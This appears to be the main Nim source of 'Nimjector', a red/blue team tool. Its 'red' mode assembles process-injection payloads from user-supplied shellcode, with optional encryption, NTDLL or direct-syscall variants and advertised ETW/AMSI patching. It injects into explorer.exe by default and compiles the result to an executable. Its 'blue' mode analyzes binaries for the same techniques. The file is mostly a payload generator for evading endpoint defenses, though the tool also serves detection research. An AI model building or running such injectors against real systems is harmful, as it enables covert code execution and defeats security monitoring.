import docopt, os, base64
include utils/utils

let doc = """
Nimjector v 1.0

Usage:
  nimjector list -t <technique_name> [-c <api_call>]
  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-e] [-E <evasion>] [-n | -s | -g]
  nimjector blue -f binary
  nimjector (-h | --help)
  nimjector --version

Options:
  -h --help     		Show this screen.
  --version     		Show version.
  -i --image shellcode.bin	File to load
  -f --file binary		Binary to analyze
  -t --technique technique_name Name of technique (For list: use "all" to print all available techniques)
  -c --call api_call   		Print specific API call (For list: use "all" to print all available calls)
  -P --print  			Print the template instead of writing into a file
  -p --process process_name   	Target process to be spawned or injected
  -E --evasion bypass_technique Applies evasion technique (Comma-delimited: etw_patch, amsi_patch or all)
  -e --encrypt    		Encrypts the shellcode 
  -n --nt  			Use NTDLL calls instead of Kernel32
  -s --syscalls  		Use Syscalls via NimlineWhisphers2
  -g --gstub   			Use GetSyscallStub
"""

var template_output: string = "payload.nim"

let args = docopt(doc, version = "Nimjector 1.0")
let technique_list = get_techniques("models/techniques.yml")
let all_techniques = get_all_techniques(technique_list)

# For listing techniques or calls
if args["list"]:
  let technique = $args["--technique"]
  let call = $args["--call"]

  if contains(all_techniques, technique) or technique == "all":
    let calls = get_calls(technique_list, technique)
    let infos = info_setup("models/info.yml")
    var new_calls = newSeq[string]()
    
    for i in calls:
      var split_call = i.split(" - ")[0]
      new_calls.add(split_call)

    if technique == "all":
      colored_print(fmt"[+] Available techniques - {intToStr(all_techniques.len)}", fgGreen)
      for i in all_techniques:
        colored_print(fmt"[-] {i}", fgGreen)
    else:
      if call == "all" or call == "false" or call == "nil":
        colored_print(fmt"[+] Technique: {technique}", fgGreen)
        colored_print(fmt"[*] Calls:", fgGreen)
        for i in new_calls:
          colored_print(fmt"[*] Listing API call description - {i}", fgGreen)
          print_info(infos, i)
      elif contains(new_calls, call):
        colored_print(fmt"[*] Listing API call description - {call}", fgGreen)
        print_info(infos, call)
      else:
        colored_print(fmt"[-] API Call not found - {call}", fgRed)
        colored_print(fmt"[-] Valid API calls:", fgGreen)
        for i in new_calls:
          colored_print(fmt"[*] {i}", fgGreen)
  else:
    colored_print(fmt"[-] Technique not found - {technique}", fgRed)
  
# For payload creation
if args["red"]:
  let shellcode_file = $args["--image"]
  let shellcode_type = $args["--encrypt"]
  let technique = $args["--technique"]

  if not contains(all_techniques, technique):
    colored_print(fmt"[!] Technique not found: {technique}", fgRed)
    quit(QuitSuccess)

  # For spawning remote processes
  var process = $args["--process"]
  if process == "nil":
     process = "explorer.exe"

  # Load shellcode 
  let shellcode = readFile(shellcode_file)

  # loading bypass techniques
  var bypass_technique = $args["--evasion"]

  # API call variations
  var variation = "kernel32"   
  if args["--nt"]:
    variation = "ntdll"
  if args["--syscalls"]:
    variation = "syscalls"
  if args["--gstub"]:
    variation = "gstub"
  colored_print(fmt"[+] Variation used: {variation}", fgGreen)

  var modules = get_modules(technique, variation, shellcode_type)
  var setup = get_init_setup(technique, technique_list, variation)
  var shellcode_template = get_shellcode_template(shellcode_type, encode(shellcode))
  #var bypass_init = get_bypass_init(bypass_technique)
  #var bypass_template = get_bypass_template(bypass_technique)

  var payload = build_template(technique, technique_list, variation)
  payload = payload.replace("REPLACE_MODULES", modules)
  payload = payload.replace("REPLACE_INIT_SETUP", setup)

  payload = payload.replace("REPLACE_PROCESS", process)
  payload = payload.replace("REPLACE_SC_TEMPLATE", shellcode_template)
  #payload = payload.replace("REPLACE_BYPASS_INIT", bypass_init)
  #payload = payload.replace("REPLACE_BYPASS", bypass_template)
  
  if args["--print"]:
    colored_print(fmt"[+] Technique: {technique} - Nim Source code:", fgGreen)
    writeFile(template_output, payload)
    colored_print("[+] Payload written to payload.nim", fgGreen)
    echo payload

  else:
    writeFile(template_output, payload)
    colored_print("[+] Payload written to payload.nim", fgGreen)

    colored_print(fmt"[+] Compiling payload.nim - {variation} variation", fgGreen)
    let res = os.execShellCmd("nim c payload.nim")
    if res == 0:
      colored_print("[+] Successfully compiled payload.exe", fgGreen)
    else:
      colored_print("[!] Failed to compile payload.exe", fgRed)
  
# For detection    
if args["blue"]:
  let bin = $args["--file"]
  process_binary(bin, technique_list)
